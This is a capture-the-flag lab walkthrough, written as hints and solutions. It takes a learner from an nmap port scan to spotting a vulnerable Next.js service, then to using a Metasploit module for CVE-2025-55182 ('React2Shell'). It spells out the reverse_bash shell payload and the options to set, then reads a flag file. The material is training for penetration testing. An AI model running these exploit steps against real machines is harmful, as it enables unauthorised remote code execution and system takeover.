There is an ubuntu machine with a  vulnerable service running on it.


- the ip adresse is ...

- maybe use look first with a certain tool what ports are open ...

hint: use nmap or zenmap to scan the machine for open ports

solution: you should find that port 3000 is open and a web service is running there.

next step: find out what web service is running there and what version it is

hint: this one is a bit easy: look at the footer of the web page

solution: the web service is a Next.js application, version 16.0.6

next step: where there any recent vulnerabilities in this version? look online!

solution: yes, there was a vulnerability called "React2Shell" with the CVE-2025-55182 / CVE-2025-66478

next step: maybe metasploit has a module for this vulnerability?

hint: search for "react2shell" or "55182" in the metasploit module search
```bash
msfconsole
search react2shell
```

solution: yes, there is a module called "exploit/multi/http/react2shell_unauth_rce_cve_2025_55182"

next step: use the module to exploit the vulnerability and get a shell on the machine. The payload "cmd/unix/reverse_bash"
will work fine. 

hint:
Do
```bash
set payload cmd/unix/reverse_bash
```
and do 
```bash
show options
```

solution: set the LHOST and LPORT options to your attacking machine's IP and the RHOST and RPORT to the target machine's IP and port 3000:

```bash
set RHOSTS <target-ip>
set RPORT 3000
set LHOST <your-ip>
set LPORT 4444
```

next step: run the exploit

hint: just do
```bash
exploit
```


next step: if everything worked fine, you should have a shell on the target machine now. Go up the directory tree to find the flag

hint: do `cd ..` until you reach the most top level, then do `ls` to list the files and `cat flag.txt` to read the flag

congratulations! you have found the flag! what's the code?


